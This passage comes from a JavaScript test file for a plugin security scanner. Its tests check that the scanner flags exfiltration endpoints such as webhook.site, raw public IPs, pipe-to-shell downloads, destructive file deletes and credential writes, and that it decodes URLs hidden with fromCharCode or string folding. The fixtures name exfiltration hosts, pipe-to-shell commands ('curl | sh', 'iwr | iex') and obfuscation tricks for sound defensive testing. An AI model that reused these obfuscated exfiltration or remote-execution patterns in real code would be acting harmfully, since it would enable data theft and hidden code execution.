  assert.equal(envWrite.severity, 'review');
  assert.equal(envWrite.line, 6);
  assert.match(envWrite.means, /DSH_VIGIL_TEST/);

  const configWrite = findingByRule(report, 'VG-CFG-01');
  assert.ok(configWrite, 'expected VG-CFG-01');
  assert.equal(configWrite.severity, 'review');
  assert.equal(configWrite.line, 7);
  assert.match(configWrite.file, /src\/config\.js/);
});

test('suspicious endpoints, raw public IPs and download-pipe execution are blockers', async () => {
  const report = await scanPluginDirectory(fixture('exfil-endpoint'));

  const endpoint = findingByRule(report, 'VG-NET-02');
  assert.ok(endpoint, 'expected VG-NET-02');
  assert.equal(endpoint.severity, 'blocker');
  assert.equal(endpoint.line, 2);
  assert.match(endpoint.evidence, /webhook\.site/);
  assert.match(endpoint.means, /webhook\.site/);

  const rawIp = findingByRule(report, 'VG-NET-03');
  assert.ok(rawIp, 'expected VG-NET-03');
  assert.equal(rawIp.severity, 'blocker');
  assert.equal(rawIp.line, 3);
  assert.match(rawIp.evidence, /203\.0\.113\.9/);

  const remotePipe = findingByRule(report, 'VG-DYN-03');
  assert.ok(remotePipe, 'expected VG-DYN-03');
  assert.equal(remotePipe.severity, 'blocker');
  assert.equal(remotePipe.line, 4);
  assert.match(remotePipe.evidence, /\|\s*sh/);

  // Loopback raw IPs must not be reported as suspicious raw-IP egress.
  const sessionNavigatorLike = await scanPluginDirectory(fixture('clean'));
  assert.equal(findingsByRule(sessionNavigatorLike, 'VG-NET-03').length, 0);
});

test('destructured and aliased fs calls still count as destructive', async () => {
  const report = await scanPluginDirectory(fixture('destructured-fs'));
  const credential = findingByRule(report, 'VG-CRED-05');
  assert.ok(credential, 'import { unlinkSync } must not evade CRED-05');
  assert.equal(credential.severity, 'blocker');
  assert.equal(credential.file, 'src/destructured.js');
  assert.equal(credential.line, 6);

  const system = findingsByRule(report, 'VG-DYN-11');
  assert.equal(system.length, 2, 'one destructured system delete and one aliased one');
  assert.deepEqual(system.map(item => item.file).sort(), ['src/aliased.js', 'src/destructured.js']);
  for (const finding of system) assert.equal(finding.confidence, 'confirmed');
});
test('declared dependencies that are not installed are reported as zombies', async () => {
  const dir = tempDir('vigil-zombie-');
  fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({
    name: 'zombie-fixture',
    version: '1.0.0',
    dependencies: { ms: '2.1.3', 'left-pad': '1.3.0' },
  }, null, 2));
  fs.mkdirSync(path.join(dir, 'node_modules', 'ms'), { recursive: true });
  fs.writeFileSync(path.join(dir, 'node_modules', 'ms', 'package.json'), JSON.stringify({ name: 'ms', version: '2.1.3' }));
  const report = await scanPluginDirectory(dir);
  const [finding] = findingsByRule(report, 'VG-SUP-19');
  assert.ok(finding, 'missing declared dependency must be reported');
  assert.equal(finding.severity, 'info');
  assert.match(finding.evidence, /left-pad/);
  assert.doesNotMatch(finding.evidence, /ms/);
  fs.rmSync(dir, { recursive: true, force: true });
});
test('fromCharCode and folded literals are decoded and judged like plaintext', async () => {
  const dir = tempDir('vigil-decode-');
  fs.mkdirSync(path.join(dir, 'src'), { recursive: true });
  fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ name: 'decode-fixture', version: '1.0.0', type: 'module', main: './src/index.js' }));
  const url = ['https://webhook', '.site/collect'].join('');
  const codes = [...url].map(ch => ch.charCodeAt(0)).join(', ');
  fs.writeFileSync(path.join(dir, 'src', 'codes.js'), [
    `const endpoint = String.fromCharCode(${codes});`,
    'export const target = endpoint;',
    '',
  ].join('\n'));
  fs.writeFileSync(path.join(dir, 'src', 'folded.js'), [
    `const endpoint = '${'https://webhook'}' + '${'.site/x'}';`,
    'export const target = endpoint;',
    '',
  ].join('\n'));
  const report = await scanPluginDirectory(dir);
  const hits = findingsByRule(report, 'VG-DYN-12');
  assert.equal(hits.length, 2, 'both encoding styles must decode to the same destination');
  for (const finding of hits) assert.equal(finding.confidence, 'confirmed');
  fs.rmSync(dir, { recursive: true, force: true });
});
test('credential writes only become blockers when the path is user-scoped', async () => {
  const dir = tempDir('vigil-cred-scope-')
  fs.mkdirSync(path.join(dir, 'src'), { recursive: true })
  fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ name: 'scope-fixture', version: '1.0.0', license: 'MIT', type: 'module', main: './src/index.js' }))
  fs.writeFileSync(path.join(dir, 'src', 'provision.js'), [
    "import { writeFileSync } from 'node:fs'",
    "import { join } from 'node:path'",
    "export function provision(dir) { writeFileSync(join(dir, '.npmrc'), 'ignore-scripts=true') }",
    '',
  ].join('\n'))
  const report = await scanPluginDirectory(dir)
  assert.equal(findingByRule(report, 'VG-CRED-05'), undefined, 'a managed .npmrc is not a user credential overwrite')
})

test('a hint string mentioning iex does not escalate to dynamic-exec + egress', async () => {
  const dir = tempDir('vigil-hint-scope-')
  fs.mkdirSync(path.join(dir, 'src'), { recursive: true })
  fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ name: 'hint-fixture', version: '1.0.0', license: 'MIT', type: 'module', main: './src/index.js' }))
  fs.writeFileSync(path.join(dir, 'src', 'i18n.js'), [
    "export const hint = 'curl | sh、iwr | iex、Invoke-Expression 等动态远程代码：拒绝 / 询问 / 允许'",
    "export const REMOTE = 'https://raw.githubusercontent.com/x/y/main/rules/manifest.json'",
    "fetch('https://example.com/x')",
    '',
  ].join('\n'))
  const report = await scanPluginDirectory(dir)
  assert.equal(findingByRule(report, 'VG-DYN-13'), undefined, 'UI copy is not executable context')
})
